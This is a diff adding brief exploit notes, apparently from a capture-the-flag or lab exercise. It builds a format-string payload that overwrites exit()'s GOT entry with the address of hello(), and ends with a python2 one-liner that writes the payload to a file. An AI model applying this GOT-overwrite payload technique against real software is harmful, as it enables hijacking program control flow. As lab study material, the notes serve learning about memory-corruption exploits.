@@ -1,0 +1,23 @@
+hello() address = 080491a6
+
+low_addr_value = 91a6 (37286 in decimal)
+high_addr_value = 0804 (2052 in decimal)
+
+
+
+exit() address = 0804b26c
+
+## convert endian dalam cyberchef tu be safe
+
+low_addr = \x6c\xb2\x04\x08
+high_addr = \x6e\xb2\x04\x08
+
+
+high_value_new = 2052 - 8 = 2044
+low_value_new = 37286 - 2052 = 35234
+
+
+payload = <high_addr> <low_addr> % <high_value_new> x %4hn % <low_value_new> x %5hn
+
+
+python2 -c 'print "\x6e\xb2\x04\x08\x6c\xb2\x04\x08%2044x%4$hn%35234x%5$hn"' > payload
